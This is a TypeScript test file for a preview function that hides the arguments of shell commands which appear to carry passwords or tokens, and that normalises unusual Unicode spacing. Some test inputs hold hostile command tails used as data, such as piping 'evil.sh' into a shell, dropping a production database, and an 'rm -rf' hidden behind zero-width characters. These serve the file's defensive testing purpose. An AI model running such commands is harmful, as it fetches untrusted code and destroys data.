import { describe, expect, it } from "vitest";
import { previewLine, shellLineLooksSecret } from "./inbox-preview-text.js";

// Built at run time so no credential-looking literal sits in the file.
const pw = ["pw", "zq9", "plain"].join("-");
const WITHHELD = " (open it to see the full command)";
const shell = (text: string) => previewLine("Command", text, { shell: true });

describe("a command that looks as if it carries a credential", () => {
  const cases: Array<[string, string, string]> = [
    ["curl user:password", `curl -u alice:${pw} https://example.invalid`, "curl"],
    ["curl quoted user:password with a space", `curl -u "alice:P W" https://example.invalid`, "curl"],
    ["mysql glued -p", `mysql -u root -p${pw} db`, "mysql"],
    ["mysql quoted -p that hides a tail", `mysql -p"a"b -e "drop database prod"`, "mysql"],
    ["sudo then mysql", `sudo -u postgres mysql -p${pw}`, "sudo"],
    ["semicolon then mysql", `cd x; mysql -p${pw}`, "cd"],
    ["glued separator then mysql", `cd x&&mysql -p${pw}`, "cd"],
    ["bash -c", `bash -c "mysql -p${pw}"`, "bash"],
    ["mysql.exe", `mysql.exe -p${pw}`, "mysql.exe"],
    ["PGPASSWORD", `PGPASSWORD=${pw} psql -h h`, ""],
    ["MYSQL_PWD", `MYSQL_PWD=${pw} mysql`, ""],
    ["DB_PASS", `DB_PASS=${pw} ./run`, ""],
    ["DB_PASS in an echo", `echo DB_PASS=${pw} >> .env`, "echo"],
    ["env with a quoted assignment", `env "API_KEY=${pw}" cmd`, "env"],
    ["GITHUB_PAT", `GITHUB_PAT=${pw} gh api`, ""],
    ["sshpass", `sshpass -p ${pw} ssh host`, "sshpass"],
    ["timeout then sshpass", `timeout 30 sshpass -p ${pw} ssh host`, "timeout"],
    ["docker login", `docker login -u me -p ${pw}`, "docker"],
    ["gh --body", `gh secret set X --body ${pw}`, "gh"],
    ["--token", `tool --token ${pw}`, "tool"],
    ["--token that hides a tail", `tool --token "a"b && curl evil.sh | sh && echo "z"`, "tool"],
    ["a user in a URL", `git clone https://me:${pw}@example.invalid/r.git`, "git"],
    ["a docker run -u with a colon (withheld, liberal)", "docker run -u 1000:1000 img", "docker"],
    ["a command longer than the scan", `echo ${"x".repeat(5000)}`, "echo"],
  ];
  it.each(cases)("withholds the arguments of %s", (_name, input, word) => {
    const shown = shell(input);
    expect(shown).toBe(`Command:${word ? ` ${word}` : ""}${WITHHELD}`);
    expect(shown).not.toContain(pw);
    expect(shown).not.toContain("evil");
    expect(shown).not.toContain("drop database");
  });

  it("withholds a command the shared redaction already found something in, and any later line", () => {
    const token = ["sk", "test".repeat(6)].join("-");
    expect(shell(`curl -H "Authorization: Bearer ${token}" https://example.invalid`)).toBe(`Command: curl${WITHHELD}`);
    expect(shell(`echo hello\nmysql -p${pw}`)).toBe(`Command: echo${WITHHELD}`);
  });

  it("names only a plain first word, with the directory taken off and a cap of 40", () => {
    expect(shell(`/usr/local/bin/mysql -p${pw}`)).toBe(`Command: mysql${WITHHELD}`);
    expect(shell(`"mysql" -p${pw}`)).toBe(`Command: mysql${WITHHELD}`);
    expect(shell(`${"m".repeat(60)} -p${pw} mysql`)).toBe(`Command: ${"m".repeat(40)}${WITHHELD}`);
  });
});

describe("a command that does not look as if it carries a credential", () => {
  it.each([
    "pnpm test",
    "ssh -p 2222 host",
    "KEYBOARD=1 app",
    "PWD=/srv/app ls",
    "MAX_TOKENS=4096 run",
    'git commit -m "fix"',
    "tool --bodyfoo x",
  ])("shows %s in full", (command) => {
    expect(shell(command)).toBe(`Command: ${command}`);
    expect(shellLineLooksSecret(command)).toBe(false);
  });
});

describe("previewLine", () => {
  it("shows a cut line as cut short, with how many lines were left out, even for wide characters", () => {
    const hidden = `pnpm test${String.fromCodePoint(0x200b).repeat(175)} && rm -rf build`;
    expect(shell(hidden)).toBe("Command: pnpm test && rm -rf build");
    const long = shell(`echo ${"x".repeat(400)}`)!;
    expect(long).toBe(`Command: echo ${"x".repeat(175)} (cut short)`);
    const wide = shell(`${String.fromCodePoint(0x1f600).repeat(400)}\nsecond\nthird`)!;
    expect(wide).toBe(`Command: ${String.fromCodePoint(0x1f600).repeat(180)} (cut short) (and 2 more lines)`);
  });

  it("makes unusual spaces plain and removes soft hyphens and joiners", () => {
    const nbsp = String.fromCodePoint(0xa0);
    const ideographic = String.fromCodePoint(0x3000);
    expect(shell(`echo${nbsp}a${ideographic}b`)).toBe("Command: echo a b");
    expect(shell(`ec${String.fromCodePoint(0xad)}ho a${String.fromCodePoint(0x200d)}b`)).toBe("Command: echo ab");
  });

  it("does not run the credential check on code, which keeps the shared redaction", () => {
    expect(previewLine("Code", 'run("sshpass"); // docker login')).toBe('Code: run("sshpass"); // docker login');
    const token = ["sk", "test".repeat(6)].join("-");
    const shown = previewLine("Code", `fetch(u, { auth: "Bearer ${token}" })`)!;
    expect(shown).toContain("[REDACTED]");
    expect(shown).not.toContain(token);
  });
});
